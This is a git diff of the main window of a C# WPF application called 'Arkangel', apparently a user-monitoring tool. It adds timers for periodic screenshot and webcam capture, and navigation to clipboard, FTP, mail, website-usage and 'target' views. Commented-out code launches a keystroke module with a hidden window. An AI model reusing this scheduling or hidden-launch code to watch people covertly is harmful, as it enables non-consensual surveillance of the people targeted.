@@ -1,20 +1,13 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using System.Windows;
-using System.Windows.Controls;
-using System.Windows.Data;
-using System.Windows.Documents;
-using System.Windows.Input;
-using System.Windows.Media;
-using System.Windows.Media.Imaging;
-using System.Windows.Navigation;
-using System.Windows.Shapes;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.Windows.Interop;
+using System.Diagnostics;
+
+using System.Timers;
+using System.Data.SQLite;
+using System.IO;
 
 namespace Arkangel
 {
@@ -39,22 +32,116 @@ namespace Arkangel
         private const uint MOD_WIN = 0x0008; //WINDOWS
         //CAPS LOCK:
         private const uint VK_CAPITAL = 0x14;
+        //Screenshot
+        public static System.Timers.Timer aTimer_scrshot;
+        //Webcam
+        public static System.Timers.Timer aTimer_webcam = new System.Timers.Timer();
+        // send mail
+        public static System.Timers.Timer aTimer_sendMail;
+       
         public MainWindow()
         {
+
             InitializeComponent();
+           // ProcessStartInfo _startkeylog = startkeylog();
             if (mainPanel.Children.ToString() != "Dashboard")
             {
                 Dashboard dashboard = new Dashboard();
                 mainPanel.Children.Add(dashboard);
             }
-            
+
+
+//Closing += new System.ComponentModel.CancelEventHandler(MainWindow_Closing);
+
+            //Keystroke
+            //try
+            //{
+            //    myProcess.StartInfo.UseShellExecute = true;
+            //    myProcess.StartInfo.FileName =@"..\..\Module\keystroke.exe";
+            //    myProcess.StartInfo.CreateNoWindow = true;
+            //    myProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            //    myProcess.Start();
+            //}
+            //catch { };
+            //Screenshot
+
+           
+            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
+            {
+                connect.Open();
+                using (SQLiteCommand fmd = connect.CreateCommand())
+                {
+                    //----------- Screenshot -----------------//
+                    // query to get values of screenshot table
+                    int Screenshot_hours = 0, Screenshot_minutes = 0, Screenshot_enable = 0;
+                    SQLiteCommand sqlComm_Screenshot = new SQLiteCommand(@"SELECT * FROM Screenshot,current_user WHERE Screenshot.id = current_user.id", connect);
+                    SQLiteDataReader data = sqlComm_Screenshot.ExecuteReader();
+                    while (data.Read())
+                    {
+                        
+                        int.TryParse(data["enable"].ToString(),out Screenshot_enable);
+                        int.TryParse(data["hours"].ToString(), out Screenshot_hours);
+                        int.TryParse(data["minutes"].ToString(), out Screenshot_minutes);
+                    }
+                    // start timer screenshot if enable
+                    if (Screenshot_enable == 1)
+                    {
+                        Functions.SetTimerScreenShot(Screenshot_hours * 60 * 60 * 1000 + Screenshot_minutes * 60 * 1000);
+                        aTimer_scrshot.Start();
+                    }
+
+                    //----------------------------------//
+                    //------------Webcam----------------//
+                    int Webcam_enable = 0, Webcam_hours = 0, Webcam_minutes = 0;
+                    SQLiteCommand sqlConn_Webcam = new SQLiteCommand(@"SELECT * FROM Webcam,current_user WHERE Webcam.id = current_user.id", connect);
+                    SQLiteDataReader wc = sqlConn_Webcam.ExecuteReader();
+                    while(wc.Read())
+                    {
+                        int.TryParse(wc["enable"].ToString(),out Webcam_enable);
+                        int.TryParse(wc["hours"].ToString(), out Webcam_hours);
+                        int.TryParse(wc["minutes"].ToString(), out Webcam_minutes);
+
+                        /// calculate time and dele folder webcam
+                        DateTime temp = DateTime.Parse(wc["datetime"].ToString());
+                        double days = Double.Parse(wc["days"].ToString());
+
+                        if (temp.AddDays(days).CompareTo(DateTime.Now) >= 0)
+                        {
+                            if (Directory.Exists("..\\..\\Webcam"))
+                            {
+                                Directory.Delete("..\\..\\Webcam", true);
+                                Console.WriteLine("Delete successful!");
+                            }
+                        }
+                    }
+                    // Start timer for webcam
+                    if (Webcam_enable == 1)
+                    {
+                        Functions.SetTimerWebcam(Webcam_hours * 60 * 60 * 1000 + Webcam_minutes * 60 * 1000);
+                        aTimer_webcam.Start();
+                    }
+                    //----------------------------------------//
+
+                }
+
+                connect.Close();
+            }
+
+
+            //Mail
+
+
+            //FTP
+
+          //  Closing += new System.ComponentModel.CancelEventHandler(windowl);
+
+
         }
         private IntPtr _windowHandle;
         private HwndSource _source;
         protected override void OnSourceInitialized(EventArgs e)
         {
             base.OnSourceInitialized(e);
-
             _windowHandle = new WindowInteropHelper(this).Handle;
             _source = HwndSource.FromHwnd(_windowHandle);
             _source.AddHook(HwndHook);
@@ -89,6 +176,7 @@ namespace Arkangel
             CloseMenu.Visibility = Visibility.Visible;
             OpenMenu.Visibility = Visibility.Collapsed;
             allIcon.Visibility = Visibility.Visible;
+            lb_title.Visibility = Visibility.Visible;
         }
 
         private void Button_CloseMenu_Click(object sender, RoutedEventArgs e)
@@ -96,7 +184,7 @@ namespace Arkangel
             CloseMenu.Visibility = Visibility.Collapsed;
             OpenMenu.Visibility = Visibility.Visible;
             allIcon.Visibility = Visibility.Hidden;
-            
+            lb_title.Visibility = Visibility.Collapsed;
         }
 
         private void bt_home_Click(object sender, RoutedEventArgs e)
@@ -109,18 +197,143 @@ namespace Arkangel
         {
             if (System.Windows.Forms.MessageBox.Show("Do you want to log out", "Warning", MessageBoxButtons.YesNo) == System.Windows.Forms.DialogResult.Yes)
             {
-
+                //ProcessStartInfo _process = startkeylog();
+                //foreach (var process in Process.GetProcessesByName("keystroke.exe"))
+                //{
+                //    process.Kill();
+                //}
+               
+                try
+                {
+                    myProcess.Kill();
+                    myProcess.Dispose();
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine(ex.ToString());
+                }
                 LoginForm loginForm = new LoginForm();
                 loginForm.Show();
                 Close();
-
             }
+           
         }
 
         private void bt_Quit_Click(object sender, RoutedEventArgs e)
         {
             Hide();
         }
+
+        private Process myProcess = new Process();
+
+        //private void Grid_Loaded(object sender, RoutedEventArgs e)
+        //{
+        //    //try
+        //    //{
+        //    //    myProcess.StartInfo.UseShellExecute = true;
+        //    //    myProcess.StartInfo.FileName = "..\\..\\Module_py\\webcam.py";
+        //    //    myProcess.StartInfo.CreateNoWindow = true;
+        //    //    myProcess.Start();
+        //    //}
+        //    //catch (Exception ex)
+        //    //{
+        //    //    Console.WriteLine("MESSAGE: " + ex.Message);
+        //    //}
+        //}
+        //private void MainWindow_Closing(object sender, System.ComponentModel.CancelEventArgs e)
+        //{
+        //    try
+        //    {
+        //        myProcess.Kill();
+        //        myProcess.Dispose();
+        //    }
+        //    catch (Exception ex)
+        //    {
+        //        Console.WriteLine(ex.ToString());
+        //    }
+        //}
+
+        private void bt_Setting_Click(object sender, RoutedEventArgs e)
+        {
+            Setting setting = new Setting();
+            setting.Show();
+        }
+
+        private void bt_qGeneral_Click(object sender, RoutedEventArgs e)
+        {
+            General general = new General();
+            mainPanel.Children.Clear();
+            mainPanel.Children.Add(general);
+        }
+
+        private void bt_qClipboard_Click(object sender, RoutedEventArgs e)
+        {
+            _Clipboard general = new _Clipboard();
+            mainPanel.Children.Clear();
+            mainPanel.Children.Add(general);
+        }
+
+        private void bt_qFTP_Click(object sender, RoutedEventArgs e)
+        {
+            FTP general = new FTP();
+            mainPanel.Children.Clear();
+            mainPanel.Children.Add(general);
+        }
+
+        private void bt_qWebcam_Click(object sender, RoutedEventArgs e)
+        {
+            Webcam webcam = new Webcam();
+            mainPanel.Children.Clear();
+            mainPanel.Children.Add(webcam);
+        }
+
+        private void bt_qTarget_Click(object sender, RoutedEventArgs e)
+        {
+            Target target = new Target();
+            mainPanel.Children.Clear();
+            mainPanel.Children.Add(target);
+        }
+
+        private void bt_qUser_Click(object sender, RoutedEventArgs e)
+        {
+            User user = new User();
+            mainPanel.Children.Clear();
+            mainPanel.Children.Add(user);
+        }
+
+        private void bt_qWU_Click(object sender, RoutedEventArgs e)
+        {
+            Website_Usage website_Usage = new Website_Usage();
+            mainPanel.Children.Clear();
+            mainPanel.Children.Add(website_Usage);
+        }
+
+        private void bt_qScrshot_Click(object sender, RoutedEventArgs e)
+        {
+            Screenshot screenshot = new Screenshot();
+            mainPanel.Children.Clear();
+            mainPanel.Children.Add(screenshot);
+        }
+
+        private void bt_qMail_Click(object sender, RoutedEventArgs e)
+        {
+            Email email = new Email();
+            mainPanel.Children.Clear();
+            mainPanel.Children.Add(email);
+        }
+
+        private void bt_qAlert_Click(object sender, RoutedEventArgs e)
+        {
+            Alert alert = new Alert();
+            mainPanel.Children.Clear();
+            mainPanel.Children.Add(alert);
+        }
+
+        private void StackPanel_MouseDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
+        {
+            DragMove();
+        }
+
     }
 }
 
